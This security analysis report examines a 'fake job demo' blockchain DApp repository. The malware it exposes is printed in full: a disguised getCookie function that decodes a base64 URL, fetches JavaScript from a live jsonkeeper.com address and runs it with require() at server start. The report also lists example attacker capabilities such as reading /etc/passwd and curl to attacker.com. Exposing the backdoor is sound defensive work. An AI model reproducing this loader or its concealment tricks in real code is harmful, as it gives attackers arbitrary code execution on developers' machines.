# Security Analysis Report — "Fake Job Demo" Dynamic DApp (Blockchain Gaming & DeFi Platform)

## ⚠️ CRITICAL SECURITY ALERT - EMBEDDED BACKDOOR FOUND

**File:** `backend/src/routes/governance.js`, lines 309–315

```javascript
//Get Cookie
exports.getCookie = asyncErrorHandler(async (req, res, next) => {
  const src = atob(process.env.DEV_API_KEY);
  const HttpOnly = (await axios.get(src)).data.cookie;
  const handler = new (Function.constructor)('require', HttpOnly);
  handler(require);
})();
```

**This is active malware. Do not run this server.**

---

### What this code does

This is an **Immediately Invoked Function Expression (IIFE)** - the trailing `()` means it executes automatically the moment Node.js loads `governance.js` (which happens on every server start via `require('./routes/governance.js')` in `server.js`). It is not gated by any route or API call.

Execution flow:

```
Server starts
  → require('./routes/governance.js')
    → IIFE fires immediately
      → atob("aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iL1ZBR1hB")
        → "https://jsonkeeper.com/b/VAGXA"
      → GET https://jsonkeeper.com/b/VAGXA
        → response.data.cookie   ← this is a string of JavaScript
      → new Function('require', <that string>)(require)
        → arbitrary JS executes with full require() access
```

### What the fetched code can do

it has `require`, so it can do anything Node.js can:

| Capability |	Exampl |
|---|---|
| Read all env vars |	process.env → exfiltrate JWT secrets, API keys |
| Read the filesystem |	require('fs').readFileSync('/etc/passwd') |
| Execute shell commands |	require('child_process').exec('id && curl attacker.com ...') |
| Open outbound connections |	require('net') or require('http') |
| Install anything |	Write a cron job, modify startup scripts |
| Exfiltrate data |	POST anything to any external URL |

### How it was concealed

- The URL is base64-encoded in `DEV_API_KEY` inside `config.env` - a committed file, so the key is always present when the repo is cloned
- The function name (`getCookie`) and comment (`//Get Cookie`) make it appear to be a routine session utility
- `Function.constructor` is a less-recognised `eval` equivalent that evades naive code-search rules
- The IIFE pattern runs silently at startup with no visible console output

## Further Security Analysis

### Security Issues

| Severity | Finding |
|---|---|
| **CRITICAL** | `backend/src/config/config.env` is committed to version control. It contains `DEV_API_KEY`, `DEV_SECRET_KEY`, `JWT_SECRET`, `ALCHEMY_API_KEY`, `ETHERSCAN_API_KEY`, and more. Even if these are placeholder values, the file is tracked by git and the `.gitignore` does not exclude `.env` files. |

## Project Overview

## What the project is

**Dynamic DApp** is a blockchain gaming & DeFi platform composed of:

| Layer | Tech |
|---|---|
| Frontend | React 18 + TypeScript, Vite, Tailwind CSS, Radix UI / shadcn |
| Backend | Node.js + Express, WebSocket (`ws`) |
| Data | In-memory mock data (`mockData.js`) - no real DB or blockchain |

a blockchain gaming & DeFi platform with a React/TypeScript frontend, an Express/Node.js backend, and six feature areas: Gaming, DeFi, NFT Marketplace, Launchpad, Governance, and DAO. Everything runs on hardcoded mock data; there is no real blockchain or database integration.

---

## Commit Structure Analysis

```
923ad03 Update README
de9b588 Edit README.md
30ef7ba Edit README.md
0dddc7d Merge branch 'alexcox052595' into main
83150a3 Merge branch 'lincolnthompsonjfy2002916' into main
...
dbfd3a9 Implement initial functionality for tsconfig.app.json, tsconfig.json, vite.config.ts
ed2378a Enhance tsconfig.app.json, tsconfig.json with additional features
d1fc556 Add basic structure for vite-env.d.ts, tailwind.config.ts, tsconfig.json, vite.config.ts
```

The commit history exhibits a clear, repeating three-step pattern for every batch of files:

1. `Add basic structure for <files>`
2. `Implement initial functionality for <files>`
3. `Enhance <files> with additional features` / `Complete implementation for <files>`

This pattern is then merged in from a series of branches with randomised usernames (`warfelbyeon95om0`, `cletogbencocxg0b`, `merelmkosaluaxu0`, `lampindokkoj55ya`, etc.) - eight such branches visible in the history. Each agent session worked in isolation on its own branch and was merged back to `main` in a round-robin fashion.

**Verdict:** The commit structure is almost entirely automated. No human would label a `tsconfig.json` file with "Add basic structure" → "Implement initial functionality" → "Enhance with additional features" across three successive commits.
